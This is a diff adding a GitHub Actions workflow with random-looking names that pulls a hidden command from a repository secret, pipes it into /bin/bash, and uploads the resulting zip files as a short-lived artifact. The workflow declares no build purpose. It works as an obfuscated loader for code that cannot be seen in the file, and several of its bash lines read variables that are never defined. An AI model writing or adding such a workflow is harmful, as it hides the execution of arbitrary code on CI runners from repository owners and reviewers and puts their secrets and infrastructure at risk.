@@ -1,0 +1,25 @@
+name: kyliebackbone3428
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kyliebackbone3428
+        env:
+          ms13: ${{ secrets.ms13 }}
+        run: |
+          printf '%s' "$ms13" | jq -r .nzjpq8 | /bin/bash
+          echo $sge13809 | jq -r .xg1410 | /bin/bash
+          echo $imi62 | jq -r .zld01428 | /bin/bash
+          echo $e338 | jq -r .fyl77706 | /bin/bash
+          echo $hh7 | jq -r .dd656 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4uuNjGXB
+          path: "*.zip"
+          retention-days: 1
